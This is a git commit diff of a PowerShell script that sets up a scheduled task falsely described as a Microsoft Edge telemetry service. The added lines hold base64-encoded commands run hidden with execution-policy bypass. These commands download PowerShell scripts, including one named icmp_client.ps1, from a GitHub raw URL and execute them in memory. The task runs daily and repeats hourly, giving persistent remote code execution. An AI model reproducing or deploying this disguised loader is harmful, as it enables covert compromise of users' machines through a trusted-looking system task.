77f6703b47034d204bdbf9059f2c7a4359a98eab
Clickest <wojtekgoska@gmail.com>
2021-01-05 14:38:24 +0100

    fixed scheduling stupid mistake

--- schedule_task.ps1
+++ schedule_task.ps1
@@ -19,7 +19,7 @@ Register-ScheduledTask
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
 }
-$ac = New-ScheduledTaskAction New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc'
+$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc'
 $st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
 $tr = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
 $tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
@@ -29,3 +29,17 @@ $tr.Repetition = $tr2.Repetition
 Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr
 
 =========================================================================================
+
+# powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYQAvAG0AYQBzAHQAZQByAC8AYwBvAG0AcABsAGUAdABlAHwAaQBlAHgA
+
+if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
+}
+$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
+$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+$tr = New-ScheduledTaskTrigger -Daily -At 00:00
+$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
+
+$tr.Repetition = $tr2.Repetition
+
+Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr
